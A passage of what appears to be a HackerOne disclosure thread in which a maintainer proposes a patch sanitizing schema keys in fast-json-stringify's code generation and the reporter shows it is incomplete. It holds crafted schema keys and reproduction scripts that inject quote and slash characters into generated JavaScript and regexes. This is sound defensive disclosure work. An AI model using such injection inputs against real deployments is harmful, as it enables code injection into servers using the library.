'$1\\\\\\'')\n+}\n+\n function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u003e {\n     if (schema.properties[key]['$ref']) {\n@@ -502,12 +507,14 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n+    var sanitized = sanitizeKey(key)\n+    var asString = sanitizeKey($asString(key))\n \n     if (nullable) {\n       code += `\n-        if (obj['${key}'] === null) {\n+        if (obj['${sanitized}'] === null) {\n           ${addComma}\n-          json += '${$asString(key)}:null'\n+          json += '${asString}:null'\n           var rendered = true\n         } else {\n       `\n@@ -515,10 +522,10 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     if (type === 'number') {\n       code += `\n-          var t = Number(obj['${key}'])\n+          var t = Number(obj['${sanitized}'])\n           if (!isNaN(t)) {\n             ${addComma}\n-            json += '${$asString(key)}:' + t\n+            json += '${asString}:' + t\n       `\n     } else if (type === 'integer') {\n       code += `\n@@ -526,25 +533,25 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n-            if (isLong(obj['${key}'])) {\n+            if (isLong(obj['${sanitized}'])) {\n               ${addComma}\n-              json += '${$asString(key)}:' + obj['${key}'].toString()\n+              json += '${asString}:' + obj['${sanitized}'].toString()\n               rendered = true\n             } else {\n-              var t = Number(obj['${key}'])\n+              var t = Number(obj['${sanitized}'])\n               if (!isNaN(t)) {\n                 ${addComma}\n-                json += '${$asString(key)}:' + t\n+                json += '${asString}:' + t\n                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n-            var t = Number(obj['${key}'])\n+            var t = Number(obj['${sanitized}'])\n             if (!isNaN(t)) {\n               ${addComma}\n-              json += '${$asString(key)}:' + t\n+              json += '${asString}:' + t\n               rendered = true\n             }\n         `\n@@ -554,9 +561,9 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n-        if (obj['${key}'] !== undefined) {\n+        if (obj['${sanitized}'] !== undefined) {\n           ${addComma}\n-          json += '${$asString(key)}:'\n+          json += '${asString}:'\n         `\n \n       var result = nested(laterCode, name, key, schema.properties[key], externalSchema, fullSchema)\n@@ -569,12 +576,12 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n-        json += '${$asString(key)}:${JSON.stringify(defaultValue).replace(/'/g, '\\'')}'\n+        json += '${asString}:${sanitizeKey(JSON.stringify(defaultValue)).replace(/'/g, '\\'')}'\n       `\n     } else if (schema.required \u0026\u0026 schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n-        throw new Error('${key} is required!')\n+        throw new Error('${sanitized} is required!')\n       `\n     }\n \n@@ -845,7 +852,7 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var type = schema.type\n   var nullable = schema.nullable === true\n \n-  var accessor = key.indexOf('[') === 0 ? key : `['${key}']`\n+  var accessor = key.indexOf('[') === 0 ? sanitizeKey(key) : `['${sanitizeKey(key)}']`\n   switch (type) {\n     case 'null':\n       code += `\n```","markdown_message":"\u003cp\u003ePlease check the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/index.js b/index.js\nindex b6bbe4f..a0fbbaa 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/index.js\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/index.js\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -119,6 +119,7 @@\u003c/span\u003e function build (schema, options) {\n   }\n\n   dependenciesName.push(code)\n\u003cspan class=\"gi\"\u003e+\n\u003c/span\u003e   return (Function.apply(null, dependenciesName).apply(null, dependencies))\n }\n\n@@ -301,7 +302,7 @@ function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n\u003cspan class=\"gd\"\u003e-        if (/${regex}/.test(keys[i])) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (/${regex.replace(/([^\\\\]+\\/)/g, \u0026#39;\\\\/\u0026#39;)}/.test(keys[i])) {\n\u003c/span\u003e     `\n     if (type === \u0026#39;object\u0026#39;) {\n       code += buildObject(pp[regex], \u0026#39;\u0026#39;, \u0026#39;buildObjectPP\u0026#39; + index, externalSchema, fullSchema)\n\u003cspan class=\"p\"\u003e@@ -491,6 +492,10 @@\u003c/span\u003e function refFinder (ref, schema, externalSchema) {\n   return (new Function(\u0026#39;schema\u0026#39;, code))(schema)\n }\n\n+function sanitizeKey (key) {\n\u003cspan class=\"gi\"\u003e+  return key.replace(/([^\\\\])\\\u0026#39;/g, \u0026#39;$1\\\\\\\u0026#39;\u0026#39;)\n+}\n+\n\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u0026gt; {\n     if (schema.properties[key][\u0026#39;$ref\u0026#39;]) {\n\u003cspan class=\"p\"\u003e@@ -502,12 +507,14 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n\n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n\u003cspan class=\"gi\"\u003e+    var sanitized = sanitizeKey(key)\n+    var asString = sanitizeKey($asString(key))\n\u003c/span\u003e\n     if (nullable) {\n       code += `\n\u003cspan class=\"gd\"\u003e-        if (obj[\u0026#39;${key}\u0026#39;] === null) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (obj[\u0026#39;${sanitized}\u0026#39;] === null) {\n\u003c/span\u003e           ${addComma}\n\u003cspan class=\"gd\"\u003e-          json += \u0026#39;${$asString(key)}:null\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          json += \u0026#39;${asString}:null\u0026#39;\n\u003c/span\u003e           var rendered = true\n         } else {\n       `\n\u003cspan class=\"p\"\u003e@@ -515,10 +522,10 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n\n     if (type === \u0026#39;number\u0026#39;) {\n       code += `\n\u003cspan class=\"gd\"\u003e-          var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e           if (!isNaN(t)) {\n             ${addComma}\n\u003cspan class=\"gd\"\u003e-            json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e       `\n     } else if (type === \u0026#39;integer\u0026#39;) {\n       code += `\n\u003cspan class=\"p\"\u003e@@ -526,25 +533,25 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n\u003cspan class=\"gd\"\u003e-            if (isLong(obj[\u0026#39;${key}\u0026#39;])) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            if (isLong(obj[\u0026#39;${sanitized}\u0026#39;])) {\n\u003c/span\u003e               ${addComma}\n\u003cspan class=\"gd\"\u003e-              json += \u0026#39;${$asString(key)}:\u0026#39; + obj[\u0026#39;${key}\u0026#39;].toString()\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              json += \u0026#39;${asString}:\u0026#39; + obj[\u0026#39;${sanitized}\u0026#39;].toString()\n\u003c/span\u003e               rendered = true\n             } else {\n\u003cspan class=\"gd\"\u003e-              var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e               if (!isNaN(t)) {\n                 ${addComma}\n\u003cspan class=\"gd\"\u003e-                json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+                json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n\u003cspan class=\"gd\"\u003e-            var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e             if (!isNaN(t)) {\n               ${addComma}\n\u003cspan class=\"gd\"\u003e-              json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e               rendered = true\n             }\n         `\n\u003cspan class=\"p\"\u003e@@ -554,9 +561,9 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n\u003cspan class=\"gd\"\u003e-        if (obj[\u0026#39;${key}\u0026#39;] !== undefined) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (obj[\u0026#39;${sanitized}\u0026#39;] !== undefined) {\n\u003c/span\u003e           ${addComma}\n\u003cspan class=\"gd\"\u003e-          json += \u0026#39;${$asString(key)}:\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          json += \u0026#39;${asString}:\u0026#39;\n\u003c/span\u003e         `\n\n       var result = nested(laterCode, name, key, schema.properties[key], externalSchema, fullSchema)\n\u003cspan class=\"p\"\u003e@@ -569,12 +576,12 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n\u003cspan class=\"gd\"\u003e-        json += \u0026#39;${$asString(key)}:${JSON.stringify(defaultValue).replace(/\u0026#39;/g, \u0026#39;\\\u0026#39;\u0026#39;)}\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        json += \u0026#39;${asString}:${sanitizeKey(JSON.stringify(defaultValue)).replace(/\u0026#39;/g, \u0026#39;\\\u0026#39;\u0026#39;)}\u0026#39;\n\u003c/span\u003e       `\n     } else if (schema.required \u0026amp;\u0026amp; schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n\u003cspan class=\"gd\"\u003e-        throw new Error(\u0026#39;${key} is required!\u0026#39;)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        throw new Error(\u0026#39;${sanitized} is required!\u0026#39;)\n\u003c/span\u003e       `\n     }\n\n@@ -845,7 +852,7 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var type = schema.type\n   var nullable = schema.nullable === true\n\n-  var accessor = key.indexOf(\u0026#39;[\u0026#39;) === 0 ? key : `[\u0026#39;${key}\u0026#39;]`\n\u003cspan class=\"gi\"\u003e+  var accessor = key.indexOf(\u0026#39;[\u0026#39;) === 0 ? sanitizeKey(key) : `[\u0026#39;${sanitizeKey(key)}\u0026#39;]`\n\u003c/span\u003e   switch (type) {\n     case \u0026#39;null\u0026#39;:\n       code += `\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-12T22:13:20.913Z","updated_at":"2019-04-12T22:13:20.913Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4554956,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"three things:\n\n- maybe it's to sanitize line `490` in the patched `index.js`. i think it's the last user input left unsanitized.\n\n- specifying a normal property like this:\n\n```javascript\nproperties: {\n    '\"\\'w00t': {\n      type: 'string',\n      default: '\"\\'w00t'\n    },\n}\n```\n\nwill produce the following field in the JSON output:\n\n```javascript\n{\"\"'w00t\":\"\"'w00t\", ...}\n```\n\n- specifying a pattern properties like this:\n\n```javascipt\n  patternProperties: {\n    '\"\\'w00t////': {\n      type: 'number'\n    }\n  },\n``` \n\nwill remove the regex test from the generated code, instead with `\"\\'w00t` the generated check was:\n\n```diff\n- 104:        if (/\"'w00t/.test(keys[i])) {\n```\n\n","markdown_message":"\u003cp\u003ethree things:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003emaybe it\u0026#39;s to sanitize line \u003ccode\u003e490\u003c/code\u003e in the patched \u003ccode\u003eindex.js\u003c/code\u003e. i think it\u0026#39;s the last user input left unsanitized.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003especifying a normal property like this:\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nl\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"k\"\u003edefault\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewill produce the following field in the JSON output:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u0026quot;:\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e, ...}\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003especifying a pattern properties like this:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e  patternProperties: {\n    \u0026#39;\u0026quot;\\\u0026#39;w00t////\u0026#39;: {\n      type: \u0026#39;number\u0026#39;\n    }\n  },\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewill remove the regex test from the generated code, instead with \u003ccode\u003e\u0026quot;\\\u0026#39;w00t\u003c/code\u003e the generated check was:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e- 104:        if (/\u0026quot;\u0026#39;w00t/.test(keys[i])) {\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-13T17:53:13.967Z","updated_at":"2019-04-13T17:53:13.967Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4555682,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you please recommend a fix for these last two problems? I'm not sure I understand, maybe a full example would help.","markdown_message":"\u003cp\u003eCan you please recommend a fix for these last two problems? I\u0026#39;m not sure I understand, maybe a full example would help.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-13T22:36:44.411Z","updated_at":"2019-04-13T22:36:44.411Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4557257,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"- here it is a full example for point 2:\n\n```javascript\n'use strict'\n\nconst fastJson = require('.')\nconst stringify = fastJson({\n  title: 'Example Schema',\n  type: 'object',\n  properties: {\n    '\"\\'w00t': {\n      type: 'string',\n      default: '\"\\'w00t'\n    }\n  }\n})\n\nconsole.log(stringify({}))\n```\nif we execute the script, the following invalid JSON is returned, using the latest patched `index.js`:\n\n`{\"\"'w00t\":\"\"'w00t\"}`\n\ninstead of the valid JSON:\n\n``{\"\\\"'w00t\":\"\\\"'w00t\"}``\n\n- regarding point 3, here it is a full example:\n\n```javascript\n'use strict'\n\nconst fastJson = require('.')\nconst stringify = fastJson({\n  title: 'Example Schema',\n  type: 'object',\n  properties: {\n    '\"\\'w00t': {\n      type: 'string',\n      default: '\"\\'w00t'\n    },\n },\n  patternProperties: {\n    '\"\\'w00t.*////': {\n      type: 'number'\n    }\n  }\n})\n\nconsole.log(stringify({\n  '\"\\'phra////': 42,\n  'asd': 42\n}))\n```\n\nwill produce the following JSON output, not compatible with the declared schema:\n\n`{\"\\\"'phra////\":42,\"\"'w00t\":\"\"'w00t\"}`\n\nnotice that `additionalProperty` was omitted and `asd` won't appear. however, the property named `\"\\'phra////` will appear due to a wrong regex check in the generated code. here it is a diff of the two outputs:\n\n```diff\n--- 1\t2019-04-14 12:49:15.879552362 +0200\n+++ 2\t2019-04-14 12:49:26.607563673 +0200\n@@ -88,7 +88,7 @@\n       for (var i = 0; i \u003c keys.length; i++) {\n         if (properties[keys[i]]) continue\n   \n-        if (/\\//.test(keys[i])) {\n+        if (/\"'w00t.*/.test(keys[i])) {\n     \n           \n   if (addComma) {\n@@ -288,4 +288,4 @@\n     ;\n      return $main\n   \n-{\"\\\"'phra////\":42,\"\"'w00t\":\"\"'w00t\",\"now\":\"2019-04-14T10:49:15.884Z\"}\n+{\"\"'w00t\":\"\"'w00t\",\"now\":\"2019-04-14T10:49:26.612Z\"}\n```\n\ninstead the correct generated regex check should have been:\n\n```javascript\nif (/\"'w00t.*\\/\\/\\/\\//.test(keys[i])) {\n```","markdown_message":"\u003cul\u003e\n\u003cli\u003ehere it is a full example for point 2:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003efastJson\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003estringify\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efastJson\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eExample Schema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eobject\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"na\"\u003edefault\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({}))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eif we execute the script, the following invalid JSON is returned, using the latest patched \u003ccode\u003eindex.js\u003c/code\u003e:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{\u0026quot;\u0026quot;\u0026#39;w00t\u0026quot;:\u0026quot;\u0026quot;\u0026#39;w00t\u0026quot;}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003einstead of the valid JSON:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{\u0026quot;\\\u0026quot;\u0026#39;w00t\u0026quot;:\u0026quot;\\\u0026quot;\u0026#39;w00t\u0026quot;}\u003c/code\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eregarding point 3, here it is a full example:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003efastJson\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003estringify\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efastJson\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eExample Schema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eobject\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"na\"\u003edefault\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n  \u003cspan class=\"na\"\u003epatternProperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00t.*////\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enumber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan 